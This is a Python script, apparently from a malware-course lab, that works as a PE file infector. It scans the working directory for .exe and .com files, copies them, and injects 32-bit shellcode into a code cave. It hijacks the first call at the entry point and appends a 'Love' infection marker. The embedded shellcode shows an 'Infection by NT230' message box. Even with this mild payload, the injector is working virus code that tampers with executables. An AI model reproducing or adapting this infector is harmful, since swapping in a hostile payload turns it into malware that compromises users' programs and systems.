import shutil
import pefile
import os
import glob
from capstone import *
def findSection(pe_file, pe):
    filedata = open(pe_file, "rb")
    for section in pe.sections:
       if section.SizeOfRawData != 0:
            position = 0
            filedata.seek(section.PointerToRawData, 0) # Di chuyển con trỏ đến đầu section
            count = 0
            while position < section.SizeOfRawData:
                byte = filedata.read(1)[0]
                position += 1
                if byte == 0x00:
                    count += 1
                else:
                    if count > minShellCode:
                        raw_addr = section.PointerToRawData + position - count - 1
                        vir_addr = image_base + section.VirtualAddress + position - count - 1
                        section.Characteristics = 0xE0000040 # Đánh dấu có thể đọc thi và chứa dữ liệu khởi tạo
                        return vir_addr, raw_addr
                    count = 0

def check_last_8_bytes(pe_file, signature=b'\x4C\x00\x6F\x00\x76\x00\x65\x00'):
    try:
        # Mở tệp ở chế độ đọc binary ('rb').
        with open(pe_file, 'rb') as file:
            # Di chuyển con trỏ tới 8 byte cuối của tệp.
            file.seek(-8, os.SEEK_END)
            # Đọc 8 byte cuối và so sánh với chuỗi 'signature'.
            return file.read(8) == signature
    except OSError as e:
        print(f"Không thể mở tệp: {e}")
        return False
    except Exception as e:
        print(f"Lỗi không xác định: {e}")
        return False

def check_call_function(pe_file, pe):
    entryPoint = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    data = pe.get_memory_mapped_image()[entryPoint:]
    cs = Cs(CS_ARCH_X86, CS_MODE_32)
    for i in cs.disasm(data, 0):
         if i.mnemonic=='call':
             return data[:i.address],i.op_str
def check_call_function_1(pe_file, pe,string2):
       filedata = open(pe_file, "rb")
       section=pe.sections[0]
       string = b""
       if section.SizeOfRawData != 0:
            position=0
            filedata.seek(section.PointerToRawData, 0) # Di chuyển con trỏ đến đầu section
            while position < section.SizeOfRawData:
                byte = filedata.read(1)[0]
                string+=byte.to_bytes(1, 'little')
                string1=b""
                if len(string)>5:
                    string1=string[len(string)-len(string2):len(string)]
                position+=1
                
                if (string1==string2):
                    vir_addr = image_base + section.VirtualAddress + position
                    raw_addr =section.PointerToRawData+position+1
                    return raw_addr,vir_addr
# Danh sách các file nguồn và file inject
filenames =  []
filenames_inject = []

# Lấy tất cả các file .exe và .com trong thư mục hiện tại
exe_files = glob.glob('*.exe')
com_files = glob.glob('*.com')

# Kết hợp danh sách các file .exe và .com
executable_files = exe_files + com_files

# Lặp qua mỗi file trong danh sách và tạo file mới có tên kết thúc bằng "-inject.exe"
for filename in executable_files:
    if not check_last_8_bytes(filename):
        # Tạo tên file mới
        filenames.append(filename)
        new_filename = f"{filename[:-4]}-inject.exe"
# Cắt phần ".exe" và thêm "-inject.exe"
        filenames_inject.append(new_filename)
        # Copy file nguồn sang file mới
        shutil.copyfile(filename, new_filename)

for pe_file in filenames_inject:
    if not check_last_8_bytes(pe_file):
        try:
            print("--------------------")
            print(f"This is a {pe_file}")

            # Load file PE
            pe = pefile.PE(pe_file)

            address_of_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
            image_base = pe.OPTIONAL_HEADER.ImageBase

            print(f"AddressOfEntryPoint: {address_of_entry_point}")
            print(f"ImageBase: {image_base}")

            if pe.sections:
                ### Chuẩn bị shell code
                shellcode = b""
                shellcode += b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31"
                shellcode += b"\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b"
                shellcode += b"\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3"
                shellcode += b"\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45"
                shellcode += b"\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
                shellcode += b"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31"
                shellcode += b"\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
                shellcode += b"\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a"
                shellcode += b"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb"
                shellcode += b"\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
                shellcode += b"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec"
                shellcode += b"\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8"
                shellcode += b"\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
                shellcode += b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
                shellcode += b"\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
                shellcode += b"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d"
                shellcode += b"\xbc\x87\x1c\x24\x52\xe8\x5f\xff\xff\xff\x68\x33"
                shellcode += b"\x30\x58\x20\x68\x20\x4e\x54\x32\x68\x6e\x20\x62"
                shellcode += b"\x79\x68\x63\x74\x69\x6f\x68\x49\x6e\x66\x65\x31"
                shellcode += b"\xdb\x88\x5c\x24\x12\x89\xe3\x68\x34\x39\x58\x20"
                shellcode += b"\x68\x35\x32\x31\x31\x68\x30\x5f\x32\x31\x68\x32"
                shellcode += b"\x32\x32\x32\x68\x5f\x32\x31\x35\x68\x32\x32\x39"
                shellcode += b"\x37\x68\x32\x31\x35\x32\x31\xc9\x88\x4c\x24\x1a"
                shellcode += b"\x89\xe1\x31\xd2\x6a\x40\x53\x51\x52\xff\xd0\x90" # Sửa lại vì để thêm shellcode call entry point
                # shellcode += b"\x89\xe1\x31\xd2\x6a\x40\x53\x51\x52\xff\xd0\x31"
                # shellcode += b"\xc0\x50\xff\x55\x08"

                minShellCode = (4 + len(shellcode) + 8) + 10

#Độ dài shellcode + 4 byte mov eax, returnAddress + 4 byte call eax + 10 byte padding nop

                print("Min shellcode: ", minShellCode)
                new_entry_point, new_raw_data = findSection(pe_file, pe)
                string,op=check_call_function(pe_file, pe)
                print(string)
                call,vir_call=check_call_function_1(pe_file, pe,string)
                print(call)
                print((vir_call+int(op,16)-5).to_bytes(4, 'little'))
                returnAddress = (address_of_entry_point + image_base)
                shellcode += string
                shellcode += b"\xb8"+(vir_call+int(op,16)-7).to_bytes(4, 'little')
                #shellcode += b"\xB8\x68\x75\x00\x01"
                shellcode += (b"\xFF\xD0\xbb"+(vir_call+5).to_bytes(4, 'little')+b"\x53\xc3")
                #shellcode += (b"\xB8" + (vir_call+5).to_bytes(4, 'little'))
                #shellcode += (b"\xB8" + returnAddress.to_bytes(4, 'little')) #Mov eax, returnAddress
                #shellcode += (b"\xFF\xD0") #Call eax
                if len(shellcode) % 4 != 0:
                    paddingBytes = b"\x90" * 10 #Nop
                    shellcode += paddingBytes
                shellcode = b"\x90\x90\x90\x90" + shellcode #Padding nop ở dầu shellcode
                pe.set_bytes_at_offset(call, (new_entry_point-vir_call-5).to_bytes(4, 'little'))
                pe.set_bytes_at_offset(new_raw_data, shellcode)
                print(new_raw_data.to_bytes(4, 'little'))
                
                pe.write(pe_file)
                print(f"Shellcode injected to {pe_file}")
                pe.close()

                ####Thêm đánh dấu
                # Mở file ở chế độ append binary ('ab') và sử dụng os to seek to the end of the file
                with open(pe_file, 'ab') as file:
                    file.seek(0, os.SEEK_END)
# Di chuyển con trỏ đến cuối file
                    file.write(b'\x4C\x00\x6F\x00\x76\x00\x65\x00')
# Thêm 8 byte

        except Exception as e:
            print(e)
            print(f"Error with file {pe_file}")
